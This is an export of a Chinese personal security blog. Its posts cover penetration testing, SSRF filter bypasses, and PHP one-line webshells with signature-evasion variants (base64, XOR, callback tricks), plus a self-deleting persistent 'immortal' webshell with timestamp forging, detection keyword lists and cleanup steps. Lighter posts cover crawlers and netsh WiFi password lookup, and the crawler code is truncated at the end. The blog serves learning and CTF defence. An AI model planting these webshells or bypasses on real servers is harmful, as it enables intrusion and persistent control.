    <content><![CDATA[<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="什么是渗透测试"><a href="#什么是渗透测试" class="headerlink" title="什么是渗透测试"></a>什么是渗透测试</h3><p>渗透测试是一种通过模拟使用黑客的技术和方法，挖掘目标系统的安全漏洞，取得系统的控制权，访问系统的机密数据，并发现可能影响业务持续运作安全隐患的一种安全测试和评估方式。<a id="more"></a><br>渗透测试和黑客入侵最大区别在于渗透测试是经过客户授权，采用可控制、非破坏性质的方法和手段发现目标和网络设备中存在弱点，帮助管理者知道自己网络所面临的问题，同时提供安全加固建议, 帮助客户提升系统的安全性。</p>
<h3 id="渗透测试的分类"><a href="#渗透测试的分类" class="headerlink" title="渗透测试的分类"></a>渗透测试的分类</h3><p>黑盒测试：是指测试人员在不清楚被测单位内部技术架构的情况下，从外部对网络设施的安全性进行测试的过程。黑盒测试借助于真实世界的黑客方法，黑客工具，有组织有步骤的对目标系统进行逐步的渗透和入侵，揭示目标系统中一些已知的和未知的安全漏洞，并评估这些漏洞是否可以被不法分子利用，并造成业务和资产损失。<br>白盒测试: 测试人员可以获取被测单位的网络结构和各种底层技术。在此基础上，使用针对性的测试方法和工具，可以以较小的代价发现和验证系统最严重的安全漏洞 。<br>在实际渗透中，两者各有利弊，需要视情况选择和进行。</p>
<h2 id="PHP入门"><a href="#PHP入门" class="headerlink" title="PHP入门"></a>PHP入门</h2><p>什么是php？</p>
<p>PHP（全称：PHP：Hypertext Preprocessor，即”PHP：超文本预处理器”）是一种通用开源脚本语言。<br>PHP 脚本在服务器上执行。<br>尝试在自己的电脑上安装一个web集成环境(phpstudy)并创建自己的第一个PHP文件。</p>
<h2 id="代码审计时需要关注的点"><a href="#代码审计时需要关注的点" class="headerlink" title="代码审计时需要关注的点"></a>代码审计时需要关注的点</h2><p>事实上，代码审计也有多种思路：例如可以选择先通读代码，理解结构和功能后再从中发现问题——但这种方式的缺点显而易见：十分耗时且令人头疼，不太适用于代码量大的情况；也可以依据经验寻找易出现问题的关键功能——这往往也可以与黑盒测试相结合，定位功能对应的代码后找到关键函数，正向或反向的追踪其中用到的变量（例如文件下载功能处若未经过滤则可能存在任意文件下载漏洞，发现该功能后定位代码段，找到其使用的功能函数——可能是file_get_contents或者别的什么，追踪它使用的变量是否有做安全过滤）；甚至你可以直接尝试定向的挖掘某一类漏洞——依旧是通过可能涉及的函数去寻找…<br>但无论你使用哪种方法进行漏洞挖掘，阅读代码的能力是必不可少的。也就是，你至少得知道开发者在做什么。</p>
<h2 id="浅谈SSRF"><a href="#浅谈SSRF" class="headerlink" title="浅谈SSRF"></a>浅谈SSRF</h2><h3 id="SSRF的定义与成因"><a href="#SSRF的定义与成因" class="headerlink" title="SSRF的定义与成因"></a>SSRF的定义与成因</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）<br>SSRF漏洞形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<h3 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h3><p>内网探测<br>利用file协议读取本地文件等等<br>向内部任意主机的任意端口发送精心构造的Payload，从而攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）<br>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</p>
<h3 id="SSRF代码层成因"><a href="#SSRF代码层成因" class="headerlink" title="SSRF代码层成因"></a>SSRF代码层成因</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210303151944229.png" alt="image-20210303151944229"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210303151959386.png" alt="image-20210303151959386"></p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210303152008385.png" alt="image-20210303152008385"></p>
<h3 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="SSRF漏洞的验证"></a>SSRF漏洞的验证</h3><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p>
<p>比如：该资源地址类型为<a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
<p>2.dnslog等工具进行测试，看是否被访问</p>
<p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p>
<h3 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h3><p>1、加端口<br>    127.0.0.1:80</p>
<p>2、短网址</p>
<p>3、指向任意IP的域名xip.io<br>    127.0.0.1.xip.io</p>
<p>4、IP限制绕过<br>十进制转换      （转换成16进制再转换回来，把.换成0，<a href="http://0x7f000001，" target="_blank" rel="noopener">http://0x7f000001，</a> 十进制就是<a href="http://2130706433" target="_blank" rel="noopener">http://2130706433</a>   )<br>八进制转换    <a href="http://0177.0.0.1" target="_blank" rel="noopener">http://0177.0.0.1</a></p>
<p>十六进制转换     <a href="http://0x7f.0.0.1" target="_blank" rel="noopener">http://0x7f.0.0.1</a><br>不同进制组合转换</p>
<p>5、@绕过<br>    <a href="http://www.baidu.com@127.0.0.1" target="_blank" rel="noopener">http://www.baidu.com@127.0.0.1</a></p>
<p>6、后面跟参数<br>    <a href="http://127.0.0.1?a=sdagwasdwfa" target="_blank" rel="noopener">http://127.0.0.1?a=sdagwasdwfa</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=8" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1VA411u7Tg?p=8</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>一句话木马</title>
    <url>/2021/03/01/yijuhua/</url>
    <content><![CDATA[<h2 id="什么是一句话木马"><a href="#什么是一句话木马" class="headerlink" title="什么是一句话木马"></a>什么是一句话木马</h2><p>一句话木马是一个可执行脚本文件，把脚本文件上传到目标服务器，然后文件被解析执行就可以达到控制目标服务器的目的。<a id="more"></a></p>
<p>之所以叫一句话，是因为它短小精悍，它的类型也有很多种，比如php、jsp、asp等等，看网站用的是哪种语言就用哪种类型的木马。</p>
<p>可能是php用的比较多，所以下面都是关于php的讲解</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h3><p><code>&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</code>或者</p>
<p><code>&lt;?php @eval($_GET[&#39;a&#39;]);?&gt;</code></p>
<p>PHP服务器识别到&lt;?php这个代码才会去解析执行，@来屏蔽错误，增加其隐蔽性，然后通过eval()函数执行变量a里面的内容</p>
<p>用get或者post传入参数a=phpinfo();后就变成</p>
<p><code>&lt;?php @eval(&quot;phpinfo();&quot;);?&gt;</code></p>
<p>想要执行什么代码，就把什么代码传给变量a即可</p>
<h3 id="上传木马攻击成功需要满足三个条件"><a href="#上传木马攻击成功需要满足三个条件" class="headerlink" title="上传木马攻击成功需要满足三个条件"></a>上传木马攻击成功需要满足三个条件</h3><p>木马能成功上传到服务器</p>
<p>知道木马在服务器的路径</p>
<p>上传的木马能被解析执行</p>
<h3 id="eval和assert的异同"><a href="#eval和assert的异同" class="headerlink" title="eval和assert的异同"></a>eval和assert的异同</h3><p>相同点：都能把字符串作为PHP代码执行</p>
<p>不同点：eval()不能被<a href="http://php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a>调用，eval()函数实际是一个语言构造器，相当于C语言中的预定义宏，属于PHP语言内部关键字</p>
<p>可变函数：PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。</p>
<p>可变函数不能用于例如 <a href="https://www.php.net/manual/zh/function.echo.php" target="_blank" rel="noopener">echo</a>，<a href="https://www.php.net/manual/zh/function.print.php" target="_blank" rel="noopener">print</a>，<a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a>，<a href="https://www.php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">isset()</a>，<a href="https://www.php.net/manual/zh/function.empty.php" target="_blank" rel="noopener">empty()</a>，<a href="https://www.php.net/manual/zh/function.include.php" target="_blank" rel="noopener">include</a>，<a href="https://www.php.net/manual/zh/function.require.php" target="_blank" rel="noopener">require</a> 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;&quot;eval&quot;</span><br><span class="line">@$a(@$_REQUEST[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br><span class="line">这样是不行的</span><br></pre></td></tr></table></figure>

<p>注：php7.1以上assert已经被废弃</p>
<h2 id="木马的各种变形"><a href="#木马的各种变形" class="headerlink" title="木马的各种变形"></a>木马的各种变形</h2><p>传统的木马防护检测一般是基于特征检测的防护，如：正则表达式和黑名单。</p>
<h3 id="传统防护检测的免杀方法："><a href="#传统防护检测的免杀方法：" class="headerlink" title="传统防护检测的免杀方法："></a>传统防护检测的免杀方法：</h3><h4 id="思路一：隐藏关键字"><a href="#思路一：隐藏关键字" class="headerlink" title="思路一：隐藏关键字"></a>思路一：隐藏关键字</h4><p>绕过php代码标志&lt;?的限制：</p>
<p><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;X&#39;])&lt;/script&gt;</code></p>
<p>拆分拼接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr&#x3D;explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;); &#x2F;&#x2F;把字符串打散为数组</span><br><span class="line">$payload&#x3D;$arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];&#x2F;&#x2F;拼接成assert</span><br><span class="line">&#x2F;&#x2F;php版本要求:&lt;&#x3D;7.0</span><br><span class="line">@$payload(@$_GET[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a&#x3D;base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">    @$a($_POST(&#39;cmd&#39;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>随机异或，用异或运算来组成字符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;也可以用十六进制进行进一步加密,例如</span><br><span class="line">&#x2F;&#x2F;$r&#x3D;&quot;x4d&quot;^&quot;x3f&quot;;</span><br><span class="line">$a&#x3D;&quot;Y&quot;^&quot;8&quot;;&#x2F;&#x2F;a</span><br><span class="line">$b&#x3D;&quot;T&quot;^&quot;&#39;&quot;;&#x2F;&#x2F;s</span><br><span class="line">$c&#x3D;&quot;*&quot;^&quot;O&quot;;&#x2F;&#x2F;e</span><br><span class="line">$d&#x3D;&quot;M&quot;^&quot;?&quot;;&#x2F;&#x2F;r</span><br><span class="line">$e&#x3D;&quot;-&quot;^&quot;Y&quot;;&#x2F;&#x2F;t</span><br><span class="line">$payload&#x3D;$a.$b.$b.$c.$d.$e;&#x2F;&#x2F;拼接成assert</span><br><span class="line">@$payload(@$_POST[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可变函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]);</span><br><span class="line">&#x2F;&#x2F;传入e&#x3D;assert&amp;x&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>可变变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;&#39;assert&#39;;</span><br><span class="line">$b&#x3D;&#39;a&#39;;</span><br><span class="line">&#x2F;&#x2F;$$b&#x3D;$a&#x3D;&#39;assert&#39;</span><br><span class="line">$$b($_POST[&#39;x&#39;]); &#x2F;&#x2F;assert($_POST[&#39;x&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="思路二：回调函数"><a href="#思路二：回调函数" class="headerlink" title="思路二：回调函数"></a>思路二：回调函数</h4><p>回调函数：PHP是将函数以string形式传递的。可以使用任何内置或用户自定义函数，但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。<br>如：call_user_func ( $callback , $parameter)</p>
<p>$callback ：被调用的回调函数<br>$parameter：0个或以上的参数，被传入回调函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@call_user_func($_GET[&#39;id&#39;],$_POST[&#39;a&#39;]);</span><br><span class="line">&#x2F;&#x2F;传入id&#x3D;eval&amp;a&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>其他回调函数：<br>call_user_func_array、array_filter、<br>register_tick_function、<br>forward_static_call、<br>………………</p>
<p>PHP手册关键字搜索回调函数：called,callable,callback………..</p>
<h2 id="木马的使用"><a href="#木马的使用" class="headerlink" title="木马的使用"></a>木马的使用</h2><p>1.执行系统命令：</p>
<p>system()–执行外部程序，并显示输出<br>passthru()–执行外部程序并且显示原始输出<br>exec()–执行一个外部程序，不输出结果，echo返回结果的最后一行。<br>shell_exec()或放在反引号里–通过shell环境执行命令，需要echo</p>
<p>2.读文件：</p>
<p>file_ get_contents 一将整个文件读入为一个字符串<br>file()一把整个文件读入一个数组中<br>readfile一读取一个文件，并写入到输出缓冲</p>
<p>3.遍历目录：</p>
<p>scandir() 函数返回一个指定目录中的文件和目录的数组。</p>
<h2 id="木马的特征与查杀-AWD"><a href="#木马的特征与查杀-AWD" class="headerlink" title="木马的特征与查杀(AWD)"></a>木马的特征与查杀(AWD)</h2><p>基于特征检测，检测敏感关键字，如：危险函数、特殊函数<br>工具：D盾</p>
<p>1、代码执行函数：<br>eval<br>assert<br>preg_replace<br>create_function<br>回调函数 call_user_func、call_user_func_array、register_tick_function、array_filter等等</p>
<p>2、命令执行函数：<br>exec()–执行一个外部程序<br>passthru()–执行外部程序并且显示原始输出<br>proc_open()–执行一个命令，并且打开用来输入/输出的文件指针<br>shell_exec()或放在两个反引号里–通过shell环境执行命令<br>system()–执行外部程序，并显示输出<br>popen()–通过参数传递一条命令，并对popen打开的文件执行</p>
<p>3、文件操作函数：<br>file_ get_contents 一将整个文件读入为一个字符串<br>file_ put_ contents 一将一个字符串写入文件<br>file()一把整个文件读入一个数组中<br>fopen一打开文件或者URL<br>move_ uploaded file 一将上传的文件移动到新位置<br>readfile一读取一个文件，并写入到输出缓冲<br>rename一重命名一个文件或目录<br>rmdir一删除目录<br>unlink &amp; delete 一删除文件</p>
<p>4、包含函数：<br>require、require_once<br>include、include_once</p>
<p>5、特殊函数：<br>phpinfo<br>变量覆盖  parse_str、extract等等</p>
<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><p>不死马即内存马，它无文件，但程序会永久的运行在PHP进程中，无限执行，很隐蔽不易被发现，也不容易被删除。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file &#x3D; &#39;.&#x2F;.index1.php&#39;;&#x2F;&#x2F;.是隐藏文件</span><br><span class="line">$code &#x3D; &#39;&lt;?php if(md5($_POST[&quot;pass&quot;])&#x3D;&#x3D;&quot;5c44d3ed7462245f57b37f8fe2a3d5de&quot;)&#123;@eval($_POST[&quot;cmd&quot;]);&#125; ?&gt;&#39;;&#x2F;&#x2F;注：</span><br><span class="line">pass参数使用了MD5加密，防止木马被他人利用。</span><br><span class="line">&#x2F;&#x2F;pass&#x3D;nepnep 用法：pass&#x3D;nepnep&amp;cmd&#x3D;command</span><br><span class="line">while (1)&#123;</span><br><span class="line">	file_put_contents($file,$code);</span><br><span class="line">	system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .index1.php&#39;);&#x2F;&#x2F;防守方可能会检查最近几分钟内修改或创建的文件，修改时间可能可以防止被检测出来</span><br><span class="line">	usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>ignore_user_abort(true)：此函数用来设置 客户机断开后是否会终止脚本的执行，设置成true，客户机断开后脚本仍然会执行。<br>set_time_limit(0)：设置脚本最大执行时间，设为0表示没有限制。<br><code>unlink(__FILE__)</code>： 删除文件本身，起到隐蔽自身的作用。<br>usleep()：延迟执行当前脚本若干微秒。</p>
<p>不死马的查杀：</p>
<p>1、重启服务，比如php 等web服务。<br>2、创建一个和不死马同名的文件夹。<br>3、删除相应进程。查出不死马进程PID后，用命令kill -9 PID 杀掉进程。<br>4、竞争写入删除不死马的文件，usleep的时间必须要小于不死马的延迟时间才会有效。</p>
<h2 id="菜刀蚁剑使用介绍"><a href="#菜刀蚁剑使用介绍" class="headerlink" title="菜刀蚁剑使用介绍"></a>菜刀蚁剑使用介绍</h2><p>小马：短小精悍，比如一句话木马，但实现的功能少；<br>大马：脚本大小会比较庞大，但它能实现更复杂的功能。<br>先传小马，再利用小马执行大马。菜刀、蚁剑等工具一键实现。</p>
<p>1、工具原理：<br>假设上传的一句话木马为：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code><br>蚁剑连接抓包：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210302151622814.png" alt="image-20210302151622814"></p>
<p>发送的请求包中，cmd连接密码中再嵌套了一句eval函数，而真正传递命令的是随机参数，随机参数传递base64编码后的命令，传递给cmd后，进行了base64解码，服务器执行解码完的命令。</p>
<p>把随机参数传递的命令解码后，如下：<br>大致意思为循环遍历路径下的文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">function asenc($out)&#123;return $out;&#125;;</span><br><span class="line">function asoutput()&#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;2652a8a9cbcf&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;76c018cc86&quot;;&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try&#123;</span><br><span class="line">    $D&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">	if($D&#x3D;&#x3D;&quot;&quot;)$D&#x3D;dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);</span><br><span class="line">	$R&#x3D;&quot;&#123;$D&#125;	&quot;;</span><br><span class="line">	if(substr($D,0,1)!&#x3D;&quot;&#x2F;&quot;)&#123;foreach(range(&quot;C&quot;,&quot;Z&quot;)as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.&#x3D;&quot;&#123;$L&#125;:&quot;;&#125;</span><br><span class="line">	else&#123;$R.&#x3D;&quot;&#x2F;&quot;;&#125;</span><br><span class="line">	$R.&#x3D;&quot;	&quot;;</span><br><span class="line">	$u&#x3D;(function_exists(&quot;posix_getegid&quot;))?@posix_getpwuid(@posix_geteuid()):&quot;&quot;;$s&#x3D;($u)?$u[&quot;name&quot;]:@get_current_user();</span><br><span class="line">	$R.&#x3D;php_uname();</span><br><span class="line">	$R.&#x3D;&quot;	&#123;$s&#125;&quot;;</span><br><span class="line">	echo $R;;</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">	echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.bilibili.com/video/BV1VA411u7Tg?p=7" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1VA411u7Tg?p=7</a></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>创建博客的初衷</title>
    <url>/2020/04/19/why-i-made-this-site/</url>
    <content><![CDATA[<h1 id="Github建站原因"><a href="#Github建站原因" class="headerlink" title="Github建站原因"></a>Github建站原因</h1><p>1.相较于CSDN、博客园，github更自由<a id="more"></a></p>
<p>2.学着使用github，上面有很多大牛，可以开拓眼界</p>
<h2 id="0x00初衷"><a href="#0x00初衷" class="headerlink" title="0x00初衷"></a>0x00初衷</h2><p>通过博客来记录学习与生活</p>
<p>记录自己所思所想，方便以后回顾来时的路</p>
<p>想通过写博客来锻炼自己写文章的能力，努力做到条理清晰、逻辑正确</p>
<p>这个博客也算是我的一个树洞吧，自己没什么社交与生活，性格内向很少开口朋友少，所以会把博客当作自己的一个朋友来倾诉或者说是与内心的自己对话 (读者少，主要写给自己看)</p>
<h2 id="0x01最后"><a href="#0x01最后" class="headerlink" title="0x01最后"></a>0x01最后</h2><p>由于刚学习使用hexo，如果页面有什么问题，还请多多包涵。</p>
<p>如果可以的话，请联系我邮箱MTI1MjQ0ODUwOEBxcS5jb20= （encoded by base64）</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
  </entry>
  <entry>
    <title>初识爬虫</title>
    <url>/2021/04/21/web-crawler/</url>
    <content><![CDATA[<p>不仅介绍了爬虫，还讲了应用场景，受益匪浅<a id="more"></a></p>
<h2 id="初始爬虫"><a href="#初始爬虫" class="headerlink" title="初始爬虫"></a>初始爬虫</h2><h3 id="什么是爬虫"><a href="#什么是爬虫" class="headerlink" title="什么是爬虫"></a>什么是爬虫</h3><p>按照一定规则，自动抓取互联网信息的程序或脚本。由于互联网数据的多样性和资源的有限性，根据用户需求定向抓取相关网页并分析是现在主流的爬取策略。</p>
<h3 id="爬虫可以做什么"><a href="#爬虫可以做什么" class="headerlink" title="爬虫可以做什么"></a>爬虫可以做什么</h3><blockquote>
<p>可以爬取图片、视频等等，只要浏览器能访问的数据都可以用爬虫获取</p>
</blockquote>
<p>我自己想的是，可以爬一些自己需要的数据，就比如之前看到某个很厉害的哥哥，用爬虫爬自己需要的论文然后自动下载，相当于爬虫+下载器。也看到过考研的人实时爬取研招网上调剂信息，以求最快获取信息，避免错过好的调剂。</p>
<p>视频里老师用生活中的商业应用举了两个例子，就是这里让我感觉受益匪浅。一个是电影天堂，它里面的电影的数据好像全是从豆瓣上爬过来的，利用<a href="https://index.baidu.com/v2/index.html#/" target="_blank" rel="noopener">百度指数</a>可以查看某个关键字的指数，相当于查某个关键字的流量把。查了一下电影天堂的搜索指数有十几万，和腾讯视频不相上下，网站上广告很多，然后利用大量的流量来赚广告费。</p>
<blockquote>
<p>这种利用网络上的资源作为引流渠道，然后用广告来变现的方式特别的多</p>
</blockquote>
<p>还有一个是天眼查，这个网站可以查公司、查老板、查关系，可以查到很多很多相关的信息。可以用来比如找工作看看公司状况、找客户、金融行业投融资行业做一些背景调查等等</p>
<blockquote>
<p>它其实是基于数据来进行一些分析提供一些方案的</p>
<p>这样的网站是卖方案的，或者说是卖会员的(付费查看)，它卖的不是信息本身，卖的是信息之间的关系</p>
</blockquote>
<h3 id="爬虫的本质是什么"><a href="#爬虫的本质是什么" class="headerlink" title="爬虫的本质是什么"></a>爬虫的本质是什么</h3><p>模拟浏览器打开网页，获取网页中想要的数据</p>
<h2 id="搜索引擎原理图"><a href="#搜索引擎原理图" class="headerlink" title="搜索引擎原理图"></a>搜索引擎原理图</h2><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210421153152467.png" alt="image-20210421153152467"></p>
<p>爬虫相当于上半部分，抓取网页内容到本地或者放到数据库里，而搜索引擎则是在爬虫的基础上再做一些索引等供用户查询</p>
<h2 id="爬虫基本流程"><a href="#爬虫基本流程" class="headerlink" title="爬虫基本流程"></a>爬虫基本流程</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>通过浏览器查看分析目标网页</p>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><p>通过HTTP库向目标站点发起请求，如果服务器正常响应，会得到一个Response</p>
<h3 id="解析内容"><a href="#解析内容" class="headerlink" title="解析内容"></a>解析内容</h3><p>得到的内容可能是HTML、Json等格式，可以用页面解析库、正则表达式等进行解析</p>
<h3 id="保存数据"><a href="#保存数据" class="headerlink" title="保存数据"></a>保存数据</h3><p>保存形式多样，可以存为文本，也可以保存到数据库，或者保存特定格式的文件</p>
]]></content>
      <categories>
        <category>爬虫相关</category>
      </categories>
  </entry>
  <entry>
    <title>命令查看连过的WIFI密码</title>
    <url>/2021/02/18/View-WiFi-password/</url>
    <content><![CDATA[<h2 id="1-win-R调用运行，输入cmd打开命令行窗口"><a href="#1-win-R调用运行，输入cmd打开命令行窗口" class="headerlink" title="1.win+R调用运行，输入cmd打开命令行窗口"></a>1.win+R调用运行，输入cmd打开命令行窗口</h2><a id="more"></a>

<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210218191658097.png" alt="image-20210218191658097"></p>
<h2 id="2-输入netsh"><a href="#2-输入netsh" class="headerlink" title="2.输入netsh"></a>2.输入netsh</h2><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210218191839429.png" alt="image-20210218191839429"></p>
<h2 id="3-在netsh中输入wlan-show-profile查看所有连过的WIFI名"><a href="#3-在netsh中输入wlan-show-profile查看所有连过的WIFI名" class="headerlink" title="3.在netsh中输入wlan show profile查看所有连过的WIFI名"></a>3.在netsh中输入wlan show profile查看所有连过的WIFI名</h2><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210218192009704.png" alt="image-20210218192009704"></p>
<h2 id="4-在netsh中输入wlan-show-profile-“WIFI名”-key-clear"><a href="#4-在netsh中输入wlan-show-profile-“WIFI名”-key-clear" class="headerlink" title="4.在netsh中输入wlan show profile “WIFI名” key=clear"></a>4.在netsh中输入wlan show profile “WIFI名” key=clear</h2><p>这里我以我手机热点”小小小麻瓜”为例，查看一下密码</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210218192318039.png" alt="image-20210218192318039"></p>
<p>关键内容即为密码</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>应用xlwt爬取豆瓣电影Top250实例</title>
    <url>/2021/05/11/crawler-of-douban-top250/</url>
    <content><![CDATA[<p>使用requests、re、BeautifulSoup、xlwt库来实现爬取豆瓣电影top250相关信息<a id="more"></a></p>
<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>程序加了详细的注释，便于理解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*- coding&#x3D;utf-8 -*-</span><br><span class="line"># @Time : 2021&#x2F;4&#x2F;21 19:10</span><br><span class="line"># @Auther : Tianze</span><br><span class="line"># @File : crawler.py</span><br><span class="line"># @Software : PyCharm</span><br><span class="line"></span><br><span class="line">from bs4 import BeautifulSoup #网页解析，获取数据</span><br><span class="line">import requests #HTTP请求</span><br><span class="line">import re #正则表达式，进行文字匹配</span><br><span class="line">import xlwt #进行excel操作</span><br><span class="line">import sqlite3 #进行SQLite数据库操作</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    url&#x3D;&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;</span><br><span class="line">    #1.爬取网页</span><br><span class="line">    datalist&#x3D;getData(url)</span><br><span class="line">    #2.逐一解析数据,边爬边解析</span><br><span class="line">    #3.保存数据</span><br><span class="line">    savepath&#x3D;&quot;.\\豆瓣电影Top250.xls&quot;</span><br><span class="line">    saveData(datalist,savepath) #按住ctrl点击函数，可以快速跳转定位</span><br><span class="line"></span><br><span class="line">#电影链接的规则</span><br><span class="line">findlink&#x3D;re.compile(r&#39;&lt;a href&#x3D;&quot;(.*?)&quot;&gt;&#39;) #.*?表示非贪婪模式</span><br><span class="line">#电影图片</span><br><span class="line">findImgSrc&#x3D;re.compile(r&#39;&lt;img.*src&#x3D;&quot;(.*?)&quot;&#39;,re.S) #返回括号中的内容，其他内容起到定位效果,re.s不忽略换行符</span><br><span class="line">#电影名</span><br><span class="line">findTitle&#x3D;re.compile(r&#39;&lt;span class&#x3D;&quot;title&quot;&gt;(.*?)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#电影评分</span><br><span class="line">findRating&#x3D;re.compile(r&#39;&lt;span class&#x3D;&quot;rating_num&quot; property&#x3D;&quot;v:average&quot;&gt;(.*?)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#评价人数</span><br><span class="line">findJudge&#x3D;re.compile(r&#39;&lt;span&gt;(\d*)人评价&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#电影寓意</span><br><span class="line">findInt&#x3D;re.compile(r&#39;&lt;span class&#x3D;&quot;inq&quot;&gt;(.*?)&lt;&#x2F;span&gt;&#39;)</span><br><span class="line">#电影相关信息</span><br><span class="line">findBd&#x3D;re.compile(r&#39;&lt;p 